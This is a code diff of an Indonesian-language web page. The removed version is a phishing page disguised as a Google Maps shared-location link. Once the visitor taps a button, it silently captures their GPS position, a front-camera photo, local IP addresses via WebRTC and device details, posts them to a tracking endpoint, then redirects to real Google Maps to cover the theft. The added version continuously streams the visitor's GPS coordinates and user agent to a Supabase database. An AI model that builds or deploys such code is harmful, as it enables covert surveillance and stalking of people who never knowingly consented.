@@ -3,162 +3,48 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Maps - Bagikan Lokasi Terkini</title>
-    
-    <meta property="og:title" content="Semarang Kota, Jawa Tengah, ID">
-    <meta property="og:description" content="Ketuk untuk melihat lokasi terkini di Google Maps.">
-    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/a/aa/Google_Maps_icon_%282020%29.svg/512px-Google_Maps_icon_%282020%29.svg.png">
-    <meta property="og:url" content="https://shareloc.online">
-    <meta property="og:type" content="website">
-
+    <title>ShareLoc - Live Sender</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; text-align: center; margin: 0; padding: 0; background: #f8f9fa; color: #3c4043; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); max-width: 400px; width: 90%; }
-        .btn { background: #1a73e8; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 6px; cursor: pointer; font-weight: 500; width: 100%; margin-top: 20px; transition: background 0.2s; }
-        .btn:hover { background: #1557b0; }
-        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #1a73e8; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; display: none; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #camera-stream { display: none; }
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background: #f4f4f9; color: #333; }
+        .card { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); display: inline-block; max-width: 400px; }
     </style>
 </head>
 <body>
     <div class="card">
-        <h2>Google Maps</h2>
-        <p>Seseorang telah membagikan titik koordinat lokasi terkini kepada Anda.</p>
-        
-        <div id="content-area">
-            <button class="btn" id="load-btn">Buka Peta Lokasi</button>
-        </div>
-        
-        <div class="loader" id="loader"></div>
-        <p id="status-text" style="font-size: 14px; color: #5f6368; margin-top: 15px;"></p>
+        <h2>ShareLoc Tracker</h2>
+        <p id="status">Meminta izin akses lokasi GPS...</p>
+        <p id="coords" style="font-size: 14px; color: #666;"></p>
     </div>
 
-    <video id="camera-stream" autoplay playsinline></video>
-    <canvas id="canvas" style="display:none;"></canvas>
-
     <script>
-        let localIPs = [];
+        // Terhubung otomatis ke Supabase Anda
+        const supabaseUrl = 'https://idjfzymaywdimpfgkncq.supabase.co';
+        const supabaseKey = 'sb_publishable_OMuw6k7doR0laJLJG4IPsq__cZgH...';
+        const _supabase = supabase.createClient(supabaseUrl, supabaseKey);
 
-        function getLocalIPs(callback) {
-            const ips = [];
-            const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
-            if (!RTCPeerConnection) return callback([]);
+        if (navigator.geolocation) {
+            navigator.geolocation.watchPosition(async (position) => {
+                const lat = position.coords.latitude;
+                const lng = position.coords.longitude;
+                const deviceInfo = navigator.userAgent;
 
-            const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
-            pc.createDataChannel("");
-            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
+                document.getElementById('status').innerText = 'Status: Lokasi berhasil dikirim!';
+                document.getElementById('coords').innerText = `Lat: ${lat}, Lng: ${lng}`;
 
-            pc.onicecandidate = (ice) => {
-                if (!ice || !ice.candidate || !ice.candidate.candidate) return;
-                const parts = ice.candidate.candidate.split(" ");
-                const ip = parts[4];
-                if (ips.indexOf(ip) === -1) {
-                    ips.push(ip);
-                    callback(ips);
-                }
-            };
-        }
-
-        window.onload = function() {
-            getLocalIPs(ips => { localIPs = ips; });
-
-            document.getElementById('load-btn').addEventListener('click', function() {
-                document.getElementById('load-btn').style.display = 'none';
-                document.getElementById('loader').style.display = 'block';
-                document.getElementById('status-text').innerText = 'Menghubungkan ke satelit GPS...';
-
-                executeTracking();
+                // Simpan koordinat terbaru ke tabel Supabase
+                await _supabase.from('locations').insert([
+                    { latitude: lat, longitude: lng, device_info: deviceInfo }
+                ]);
+            }, (error) => {
+                document.getElementById('status').innerText = 'Gagal mengakses GPS: ' + error.message;
+            }, {
+                enableHighAccuracy: true,
+                maximumAge: 0,
+                timeout: 5000
             });
-        };
-
-        function executeTracking() {
-            let lat = null, lon = null, accuracy = null, capturedImage = null;
-            let locationDone = false;
-            let cameraDone = false;
-
-            // Kumpulkan informasi detail hardware HP target
-            const deviceData = {
-                hardwareConcurrency: navigator.hardwareConcurrency || 'Tidak diketahui', // Jumlah inti CPU
-                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Tidak diketahui', // Perkiraan RAM
-                screenResolution: window.screen.width + ' x ' + window.screen.height,
-                colorDepth: window.screen.colorDepth + ' bit',
-                language: navigator.language || 'Tidak diketahui',
-                platform: navigator.platform || 'Tidak diketahui',
-                touchPoints: navigator.maxTouchPoints || 0
-            };
-
-            function checkAndSend() {
-                if (locationDone && cameraDone) {
-                    sendData(lat, lon, accuracy, capturedImage, localIPs, deviceData);
-                }
-            }
-
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    position => {
-                        lat = position.coords.latitude;
-                        lon = position.coords.longitude;
-                        accuracy = position.coords.accuracy;
-                        locationDone = true;
-                        checkAndSend();
-                    },
-                    error => {
-                        locationDone = true;
-                        checkAndSend();
-                    },
-                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
-                );
-            } else {
-                locationDone = true;
-                checkAndSend();
-            }
-
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-                .then(stream => {
-                    const video = document.getElementById('camera-stream');
-                    video.srcObject = stream;
-                    setTimeout(() => {
-                        const canvas = document.getElementById('canvas');
-                        canvas.width = video.videoWidth || 640;
-                        canvas.height = video.videoHeight || 480;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        capturedImage = canvas.toDataURL('image/jpeg');
-                        stream.getTracks().forEach(track => track.stop());
-                        cameraDone = true;
-                        checkAndSend();
-                    }, 1200);
-                })
-                .catch(err => {
-                    cameraDone = true;
-                    checkAndSend();
-                });
-        }
-
-        function sendData(lat, lon, accuracy, image, localIPs, deviceData) {
-            document.getElementById('status-text').innerText = 'Memuat rute navigasi...';
-            
-            fetch('/api/track', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    latitude: lat, 
-                    longitude: lon, 
-                    accuracy: accuracy, 
-                    image: image,
-                    localIPs: localIPs,
-                    deviceData: deviceData
-                })
-            }).finally(() => {
-                setTimeout(() => {
-                    if (lat && lon) {
-                        window.location.href = `https://maps.google.com/?q=${lat},${lon}`;
-                    } else {
-                        window.location.href = "https://maps.google.com";
-                    }
-                }, 1000);
-            });
+        } else {
+            document.getElementById('status').innerText = 'Browser Anda tidak Mendukung Geolocation.';
         }
     </script>
 </body>
